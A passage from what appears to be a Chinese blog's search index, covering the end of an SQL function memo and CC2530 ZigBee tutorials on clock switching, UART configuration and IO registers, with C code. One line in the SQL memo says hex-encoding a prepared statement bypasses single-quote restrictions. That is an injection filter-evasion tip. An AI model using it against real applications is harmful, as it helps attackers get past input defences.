title="MID(column_name,start[,length])"></a>MID(column_name,start[,length])</h2><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200224203301659.png" alt=""></p><p>必要的时候可以不用逗号用<code>from</code>和<code>for</code>代替，<code>mid(string from start for length)</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200224204817021.png" alt=""></p><h2 id="Like"><a href="#Like" class="headerlink" title="Like"></a>Like</h2><p>LIKE 操作符用于在 WHERE 子句中搜索列中的指定模式。</p><p>支持通配符匹配，like有两个模式：<code>_</code>和<code>%</code></p><p><strong>_</strong>：表示单个字符，<strong>%</strong>：表示0个或多个任意字符</p><p>例如：<code>name,%,%e,n%,%a%,_ame,____,_%_</code>都匹配<code>name</code>这个字符</p><h2 id="Rlike和Regexp"><a href="#Rlike和Regexp" class="headerlink" title="Rlike和Regexp"></a>Rlike和Regexp</h2><p><code>rlike==regexp</code>  都是正则匹配，特殊字符需要进行适当的反斜杠转义</p><h2 id="INSTR-C1-C2-I-J"><a href="#INSTR-C1-C2-I-J" class="headerlink" title="INSTR(C1,C2,I,J)"></a>INSTR(C1,C2,I,J)</h2><p><strong>C1</strong>：表示被搜索的字符串</p><p><strong>C2</strong>：希望搜索的字符串</p><p><strong>I</strong>：搜索的开始位置，默认为1</p><p><strong>J</strong>：出现的位置，默认为1</p><p>返回值为匹配开始的位置，sql中第一个字符的位置为1</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200503180526297.png" alt=""></p><h2 id="IF-expr1-expr2-expr3"><a href="#IF-expr1-expr2-expr3" class="headerlink" title="IF(expr1,expr2,expr3)"></a>IF(expr1,expr2,expr3)</h2><p>如果<strong>expr1</strong>是<strong>TRUE(expr1&lt;&gt;0 and expr1&lt;&gt;NULL)</strong>，则语句发返回值为<strong>expr2</strong>，否则返回<strong>expr3</strong></p><p>另外还有一种写法：<code>case when expr1 then expr2 else expr3</code></p><h2 id="limit-i-n"><a href="#limit-i-n" class="headerlink" title="limit i,n"></a>limit i,n</h2><p><strong>i</strong>：为查询结果的索引值，默认从0开始</p><p><strong>n</strong>：为从第<strong>i</strong>条开始之后的<strong>n</strong>条记录</p><h2 id="set-a-’-sql-’-prepare-table-from-a-execute-table"><a href="#set-a-’-sql-’-prepare-table-from-a-execute-table" class="headerlink" title="set  @a=’(sql)’;prepare (table) from @a;execute (table);"></a>set  @a=’(sql)’;prepare (table) from @a;execute (table);</h2><p><strong>sql</strong>：为要执行的sql语句，可以将其化为十六进制后传入饶过单引号限制</p><p><strong>table</strong>：为执行sql语句的表</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200503214904653.png" alt=""></p><h2 id="BINARY"><a href="#BINARY" class="headerlink" title="BINARY()"></a>BINARY()</h2><p>SQL语句中默认是不区分大小写，在sql语句中加上<strong>binary</strong>即可区分</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200503214747191.png" alt=""></p><h2 id="CAST-expr-as-type-CONVERT-expr-type"><a href="#CAST-expr-as-type-CONVERT-expr-type" class="headerlink" title="CAST(expr as type),CONVERT(expr,type)"></a>CAST(expr as type),CONVERT(expr,type)</h2><p>转换任意类型<strong>expr</strong>为指定的<strong>type</strong>类型</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200503214604050.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>时钟，串口配置</title>
      <link href="/2020/01/15/%E6%97%B6%E9%92%9F%EF%BC%8C%E4%B8%B2%E5%8F%A3%E9%85%8D%E7%BD%AE/"/>
      <url>/2020/01/15/%E6%97%B6%E9%92%9F%EF%BC%8C%E4%B8%B2%E5%8F%A3%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="切换系统高频时钟源"><a href="#切换系统高频时钟源" class="headerlink" title="切换系统高频时钟源"></a>切换系统高频时钟源</h1><p>CC2530在正常运行的时候需要一个高频时钟信号和一个低频的时钟信号</p><ul><li>高频时钟信号：主要供给给CPU，保证程序的运行</li><li>低频时钟信号：主要供给看门狗，睡眠定时器等偏上外设</li></ul><p>时钟信号来源</p><ul><li>高频信号两个来源：芯片内部的16M RC电路；外接的32M石英晶振</li><li>低频信号两个来源：芯片内部的32K RC电路，外接的32.768K石英晶振</li></ul><p>CC2530默认上电的时候，是内部的2个RC电路作为高频和低频的时钟来源</p><p>如果我们在用串口，特别是无线通信的时候，必须要用32M的石英晶振作为高频时钟来源，16M比32M的速度慢，为32M的1/2</p><p>高频时钟源特点：</p><ul><li>两个高频时钟源可以同时起振产生高频时钟信号</li><li>而两个低频时钟源，某一时刻只能有1个起振，并且起振能的这个时钟源供给CC2530</li></ul><p>切换步骤：</p><p>1、2个高频时钟源起振； 让SLEEPCMD的第2位为0；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SLEEPCMD &amp;=<span class="number">0xFB</span>;<span class="comment">//1111 1011 开启2个高频时钟源</span></span><br></pre></td></tr></table></figure><p>2、待目标时钟源振荡稳定；SLEEPSTA寄存器的第6位为1表示32 时钟源稳定</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">0</span>==(SLEEPSTA &amp; <span class="number">0x40</span>));<span class="comment">// 0100 0000 等待32M稳定</span></span><br></pre></td></tr></table></figure><p>3、 延时一小段时间63us（不定）； 超过63微秒延时</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delayus</span><span class="params">()</span><span class="comment">//调用函数实现</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> k=<span class="number">63</span>;</span><br><span class="line">    <span class="keyword">while</span>(k--);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4、不分频输出； 把寄存器CLKCONCMD的低3位 设置为000，表示不分频输出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CLKCONCMD &amp;=<span class="number">0xF8</span>;<span class="comment">//1111 1000 不分频输出</span></span><br></pre></td></tr></table></figure><p>5、 选中目标高频时钟源作为系统主时钟； 把寄存器CLKCONCMD的第6位 清0，设置32M作为系统主时钟</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CLKCONCMD &amp;=<span class="number">0XBF</span>;<span class="comment">//1011 1111 设置32M作为系统主时钟</span></span><br></pre></td></tr></table></figure><p>6、确认一下当前工作的系统时钟是不是所选的高频时钟；如果读CLKCONSTA这个寄存器的第6位为0，表示32M的时钟源已经作为了当前的系统主时钟，程序可以往下运行了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(CLKCONSTA &amp; <span class="number">0x40</span>); <span class="comment">//0100 0000 等待32M成功成为当前系统主时钟</span></span><br></pre></td></tr></table></figure><h1 id="数码管测试"><a href="#数码管测试" class="headerlink" title="数码管测试"></a>数码管测试</h1><p>32M代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iocc2530.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"74LS164_8LED.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delayus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> k=<span class="number">63</span>;</span><br><span class="line">    <span class="keyword">while</span>(k--);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delay</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i,j;</span><br><span class="line">     <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1000</span>;i++)</span><br><span class="line">       <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">800</span>;j++);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Init32M</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   SLEEPCMD &amp;=<span class="number">0xFB</span>;<span class="comment">//1111 1011 开启2个高频时钟源</span></span><br><span class="line">   <span class="keyword">while</span>(<span class="number">0</span>==(SLEEPSTA &amp; <span class="number">0x40</span>));<span class="comment">// 0100 0000 等待32M稳定</span></span><br><span class="line">   delayus();</span><br><span class="line">   CLKCONCMD &amp;=<span class="number">0xF8</span>;<span class="comment">//1111 1000 不分频输出</span></span><br><span class="line">   CLKCONCMD &amp;=<span class="number">0XBF</span>;<span class="comment">//1011 1111 设置32M作为系统主时钟</span></span><br><span class="line">   <span class="keyword">while</span>(CLKCONSTA &amp; <span class="number">0x40</span>); <span class="comment">//0100 0000 等待32M成功成为当前系统主时钟</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">char</span> i;</span><br><span class="line">     LS164_Cfg();</span><br><span class="line">     Init32M();</span><br><span class="line">     <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">         &#123;</span><br><span class="line">            LS164_BYTE(i);<span class="comment">//数码管显示函数，i为几，数码管显示几</span></span><br><span class="line">            <span class="built_in">delay</span>();</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>16M代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iocc2530.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"74LS164_8LED.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delay</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i,j;</span><br><span class="line">     <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1000</span>;i++)</span><br><span class="line">       <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">800</span>;j++);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">char</span> i;</span><br><span class="line">     LS164_Cfg();</span><br><span class="line">     <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">         &#123;</span><br><span class="line">            LS164_BYTE(i);</span><br><span class="line">            <span class="built_in">delay</span>();</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外附上74LS164_8LED 数码管显示的代码，把代码添加到工程里即可</p><p>74LS164_8LED.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __74LS164_8LED_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __74LS164_8LED_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ioCC2530.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  LS164_DATA  P1_3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  LS164_CLK   P1_2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  UCHAR  unsigned char </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LS164_Cfg</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LS164_BYTE</span><span class="params">(UCHAR Data)</span></span>;<span class="comment">//P1.3  DATA   P1.2  CLK</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>74LS164_8LED.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ioCC2530.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"74LS164_8LED.h"</span></span></span><br><span class="line"><span class="keyword">static</span> UCHAR LED_Map[]=&#123;<span class="number">0x3f</span>,<span class="number">0x06</span>,<span class="number">0x5b</span>,<span class="number">0x4f</span>,</span><br><span class="line">                        <span class="number">0x66</span>,<span class="number">0x6d</span>,<span class="number">0x7d</span>,<span class="number">0x07</span>,</span><br><span class="line">                        <span class="number">0x7f</span>,<span class="number">0x6f</span>,<span class="number">0x00</span>,<span class="number">0xFF</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LS164_Cfg</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    P1SEL &amp;=~<span class="number">0x0C</span>;<span class="comment">//xxxx 00xx  配置为普通IO模式</span></span><br><span class="line">    P1DIR |=<span class="number">0x0C</span>;<span class="comment">//xxxx 11xx   配置为输出模式</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LS164_BYTE</span><span class="params">(UCHAR Index)</span> <span class="comment">//P1.3  DATA   P1.2  CLK</span></span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    UCHAR i=<span class="number">0</span>;</span><br><span class="line">    UCHAR Data=LED_Map[Index];</span><br><span class="line">    <span class="keyword">for</span>(;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">0x80</span> &amp; Data)</span><br><span class="line">        &#123;</span><br><span class="line">            LS164_DATA=<span class="number">1</span>;            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            LS164_DATA=<span class="number">0</span>; </span><br><span class="line">        &#125;</span><br><span class="line">        Data=Data &lt;&lt; <span class="number">1</span>;</span><br><span class="line">        LS164_CLK=<span class="number">0</span>;</span><br><span class="line">        LS164_CLK=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="USB转串口配置"><a href="#USB转串口配置" class="headerlink" title="USB转串口配置"></a>USB转串口配置</h1><p>CC2530具备两个串口，且每个串口都可以配置选择控制脚</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%97%B6%E9%92%9F%EF%BC%8C%E4%B8%B2%E5%8F%A3%E9%85%8D%E7%BD%AE/image-0.png" alt=""></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%97%B6%E9%92%9F%EF%BC%8C%E4%B8%B2%E5%8F%A3%E9%85%8D%E7%BD%AE/image-91.png" alt=""></p><p><strong>步骤：</strong></p><p>1、指定串口的IO位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PERCFG &amp;=<span class="number">0xFE</span>;<span class="comment">//1111 1110 选中串口0的的备用位置1</span></span><br></pre></td></tr></table></figure><p>2、相应IO配置成偏上外设功能</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P0SEL |=<span class="number">0x0C</span>;       <span class="comment">//0000 1100 P0_2 p0_3为偏上外设功能</span></span><br></pre></td></tr></table></figure><p>3、8个数据位，1个停止位，无流控，无校验确立</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U0CSR |=<span class="number">0Xc0</span>;</span><br></pre></td></tr></table></figure><p>4、波特率设置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">U0GCR =<span class="number">8</span>;</span><br><span class="line">U0BAUD=<span class="number">59</span>;</span><br></pre></td></tr></table></figure><img src="https://gitee.com/Extrader/blogimage/raw/master/image/时钟，串口配置/image-95.png" style="zoom: 80%;" /><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%97%B6%E9%92%9F%EF%BC%8C%E4%B8%B2%E5%8F%A3%E9%85%8D%E7%BD%AE/image-92-e1579148396866.png" alt=""></p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/时钟，串口配置/image-94.png" style="zoom:67%;" /><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%97%B6%E9%92%9F%EF%BC%8C%E4%B8%B2%E5%8F%A3%E9%85%8D%E7%BD%AE/image-93.png" alt=""></p><p>5、开CPU中断，对应串口接收中断</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EA=<span class="number">1</span>;</span><br><span class="line">URX0IE=<span class="number">1</span>;<span class="comment">//结尾为0或8则可以直接选择赋值</span></span><br></pre></td></tr></table></figure><p>USART0接收字符利用中断服务函数</p><ul><li><p>当一个字节由串口接收到C2530，字节会保存到U0DBUF寄存器，同时接收中断标志URX0IF位会置1</p></li><li><p>可以利用中断服务程序来接收该字符串</p></li><li><p>中断服务函数</p><p>#pragma vector = URX0_VECTOR<br>__interrupt void UART0_ISR(void)</p></li></ul><h1 id="总测试代码"><a href="#总测试代码" class="headerlink" title="总测试代码"></a><strong>总测试代码</strong></h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iocc2530.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> ch;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Cfg32M</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SLEEPCMD &amp;=<span class="number">0xFB</span>; <span class="comment">//fB 0 00 让2个时钟源都起振</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">0</span>==(SLEEPSTA &amp; <span class="number">0x40</span>));  <span class="comment">//  0100 0000  如果32M 晶振供电且稳定了，那么程序往下运行</span></span><br><span class="line">    CLKCONCMD &amp;=<span class="number">0xF8</span>; <span class="comment">//1111 1000 不分频输出</span></span><br><span class="line"></span><br><span class="line">    CLKCONCMD &amp;=<span class="number">0xBF</span>;<span class="comment">//1011 1111 让32M作为系统主时钟供给CPU</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>==(CLKCONSTA &amp; <span class="number">0x40</span>));<span class="comment">//如果32M确实供给CPU在工作，那么程序往下执行</span></span><br><span class="line">    SLEEPCMD |=<span class="number">0x40</span>;<span class="comment">// 0000 0100 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UartCfg</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//串口0的备用位置1配置成波特率9600</span></span><br><span class="line">   PERCFG &amp;=<span class="number">0xFE</span>;<span class="comment">//1111 1110 选中串口0的的备用位置1</span></span><br><span class="line">   P0SEL  |=<span class="number">0x0C</span>;       <span class="comment">//0000 1100 P0_2 p0_3为偏上外设功能</span></span><br><span class="line">   </span><br><span class="line">   U0CSR |=<span class="number">0Xc0</span>;</span><br><span class="line">   </span><br><span class="line">   U0GCR =<span class="number">8</span>;</span><br><span class="line">   U0BAUD=<span class="number">59</span>;</span><br><span class="line">   EA=<span class="number">1</span>;</span><br><span class="line">   URX0IE=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Cfg32M();</span><br><span class="line">  UartCfg();</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> vector=URX0_VECTOR<span class="comment">//中断服务函数</span></span></span><br><span class="line"><span class="function">__interrupt <span class="keyword">void</span> <span class="title">UART0_ISR</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    URX0IF=<span class="number">0</span>;<span class="comment">//串口0来数据的标志位，硬件会置1，我们软件要清0</span></span><br><span class="line">    ch=U0DBUF;<span class="comment">//从接受寄存器里取字节存入变量ch</span></span><br><span class="line">    </span><br><span class="line">    U0DBUF=ch;<span class="comment">//把变量ch里的值赋给串口0发送数据寄存器</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">0</span>==UTX0IF);</span><br><span class="line">    UTX0IF=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ZigBee </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ZigBee </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO控制与外部中断</title>
      <link href="/2020/01/14/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/"/>
      <url>/2020/01/14/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/</url>
      
        <content type="html"><![CDATA[<p>CC2530只具备<a href="https://baike.baidu.com/item/QFN%E5%B0%81%E8%A3%85/5168878?fr=aladdin" target="_blank" rel="noopener">QFN</a>40封装 工作范围：2~3.6V(推荐选3.3V)</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-67.png" alt=""></p><p>一共有21个通用IO口，其中这21个分为3组P0\P1\P2； 其中P0\P1组各8个IO，P2组5个（P2_0、P2_1、 P2_2、P2_3、 P2_4）。</p><p>这些口子都可以作为普通或对应的片上外设控制。</p><p>其中P1_0 P1_1有20mA的输出驱动能力，其余的只有4mA</p><p>PxSEL、PxDIR、PxINP Px（x分别对应0、1、2,用来控制对应的IO口组）3种寄存器；复位、默认都是0</p><h1 id="PxSEL寄存器"><a href="#PxSEL寄存器" class="headerlink" title="PxSEL寄存器"></a>PxSEL寄存器</h1><p>PxSEL寄存器作用: 有8位，每一位对应具体的IO组中的相应的一个IO，决定它是普通IO口还是片上外设，0表示普通IO口，1表示片上外设。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-68.png" alt=""></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-69.png" alt=""></p><h1 id="PxDIR寄存器"><a href="#PxDIR寄存器" class="headerlink" title="PxDIR寄存器"></a>PxDIR寄存器</h1><p>PxDIR寄存器作用: 有8位，每一位对应具体的IO组中的相应的一个IO，决定它是输入还是输出，0表示输入，1表示输出。</p><p>特别注意：其中P2组只有5个IO口，低五位也对应P2_0 … P2_4 后面的位不用管。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-70.png" alt=""></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-71.png" alt=""></p><h1 id="PxINP寄存器"><a href="#PxINP寄存器" class="headerlink" title="PxINP寄存器"></a>PxINP寄存器</h1><p>PxINP寄存器作用: 在输入的时候，8位，每一位对应具体的IO组中的相应的一个IO，决定它是上下拉模式还是三态，0表示上下拉模式，1表示三态。</p><p>特别注意：其中P2组只有5个IO口，低五位也对应P2_0 … P2_4 ，后面的3位决定在配置为上下拉模式的时候，组为上拉 还是下拉，0表示上拉，1表示下拉。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-72.png" alt=""></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/IO%E6%8E%A7%E5%88%B6%E4%B8%8E%E5%A4%96%E9%83%A8%E4%B8%AD%E6%96%AD/image-73.png" alt=""></p><h1 id="EA"><a 